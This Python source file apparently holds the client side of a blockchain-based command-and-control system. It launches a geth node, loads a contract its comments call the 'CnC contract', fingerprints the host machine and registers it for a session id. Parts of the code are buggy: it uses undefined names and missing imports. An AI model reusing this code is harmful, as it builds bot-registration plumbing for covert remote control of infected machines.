
import yaml
import os,time, sys
from os.path import join as opj

import yaml
from solc import compile_source
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from Util.EtherKeysUtil import *
from web3.utils.events import get_event_data
from web3.utils.abi import filter_by_name
from Util.SolidityTypeConversionUtil import *
import shutil, atexit
from Util.EtherKeysUtil import *

from web3.contract import ConciseContract


REGISTRATION_EVENT_NAME = 'InstanceRegistered'
from geth import DevGethProcess


l = LogWrapper.getLogger()

class ClientCommands:

	def __init__(self, confFile):
		conf = yaml.safe_load(open(opj('conf','gen', confFile)))

		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		# TODO: check node is up. load node if not ,wait for connection and sync.
		proc = self.runGethNode(conf)
		# connect to local node
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

		# load CnC contract
		self.contract = self.loadContract()
		#TODO: check contract is up, otherwise go to sleep or die

		self.password = conf['clientWalletPassword']
		self.public, self.private, self.address = loadWallet(conf['clientWallet'], self.password)

		l.info("client wallet:",self.address, "contract:",self.contractAddress)
		registerAccount(self.web3, self.address, self.private, self.password)

	def loadContract(self):
		l.info('loading contract from:', self.contractAddress, self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	def registered(self):
		return self.sessionId != None

	def registerInstance(self):
		self.machineId = OsInteractions.fingerprintMachine()

		currBlock = self.web3.eth.blockNumber
		filter = self.web3.eth.filter({'from': cc.walletAddress, 'fromBlock': currBlock})

		try:
			self.contract.transact({'from': self.walletAddress}).registerInstance(self.machineId)

			logs=[]
			while (not logs):
				logs = filter.get(True)
				time.sleep(0.1)
				#print ('iteration...')

			self.web3.eth.uninstallFilter(filter.filter_id)


			self.sessionId = bytesToHexString(self.getLogData(REGISTRATION_EVENT_NAME, logs)[0]['args']['sessionId'])
			print ('Successful registration! SessionId:',self.sessionId)
		except Exception as e:
			print("Error in returned log event:", e)
			self.sessionId = None

		return self.registered()


	def getLogData (self, eventName, logs) -> list:
		#eabi = [m for m in self.abi if m.get('name', '-1') == eventName]
		eabi = filter_by_name(eventName,cc.abi)
		return [get_event_data(eabi[0],log) for log in logs ] if eabi else []


	def runGethNode(self, conf):
		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
		if (os.path.isfile(gethLockFile)):
			with open (gethLockFile) as f:
				pid = f.read()
				if (pid):
					try:
						os.kill(int(pid), signal.SIGTERM)
						time.sleep (1)
						l.debug('Old geth was running at PID:',pid,'. Killed.')
					except OSError:
						pass #all good because process wasn't running anymore

		# genesis = ast.literal_eval(conf['genesis'])

		if conf['opMode'] == 'test':
			if not os.path.exists(conf['genesisFile']):
				l.warning('Fresh start! removing blockchain dir ',conf['BlockChainData'])

				shutil.rmtree(conf['BlockChainData'],ignore_errors=True)

				with open(conf['genesisFile'],'w') as f:
					json.dump(conf['genesis'],f, indent=1)

				l.info('Initializing blockchain...')
				command =' '.join([conf['geth'],'--datadir',conf['BlockChainData'],'init',conf['genesisFile']])

				l.debug('Running geth init: ' , command)
				with open(opj('logs', 'geth.server.log'), 'a') as f:
					proc = runCommand(command, stdout=f)
					proc.communicate()
		elif conf['opMode'] == 'TestNet':
			pass
		elif conf['opMode'] == 'RealNet':
			pass

		l.info('Running geth node...')
		command = ' '.join(conf['gethCmd'])
		l.debug('Running light geth : ' , command)

		proc = runCommand(command, stderr=open(opj('logs', 'geth.client.log'), 'a'))

		if proc.returncode:
			std,sterr = proc.communicate()
			raise ValueError(format_error_message(
				"Error trying to run geth node",
				command,
				proc.returncode,
				std,
				sterr,
			))

		atexit.register(
			lambda: kill_proc(proc))

		time.sleep(3)

		with open(gethLockFile,'w') as f:
			f.write(str(proc.pid))
		l.info('Geth node running. PID:',str(proc.pid))

		return proc

if __name__ == "__main__":
	l.info ("base dir ",sys.argv[1])
	os.chdir(sys.argv[1])

	cc = ClientCommands('clientConf-test.yaml')

	#cc.registerInstance()

	#print ("wallet:",cc.walletAddress, "sessionId", cc.sessionId, "machineId:",cc.machineId)




